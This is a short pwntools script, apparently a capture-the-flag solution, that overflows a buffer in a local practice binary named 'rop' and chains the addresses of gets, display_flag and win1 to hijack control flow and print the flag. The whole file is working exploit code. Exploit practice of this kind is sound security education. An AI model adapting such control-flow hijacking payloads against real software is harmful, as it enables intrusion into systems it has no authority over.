from pwn import *

p = process('./rop')
b = ELF('./rop')

gets_plt = b.symbols['gets']
display_flag = b.symbols['display_flag']
win1_addr = b.symbols['win1']
#print(hex(win1_addr))

payload = 'A'*28
payload += p32(gets_plt)
payload += p32(display_flag)
payload += p32(win1_addr)

p.sendlineafter('> ', payload)
p.sendline('\x01'*3)
print(p.recvall())
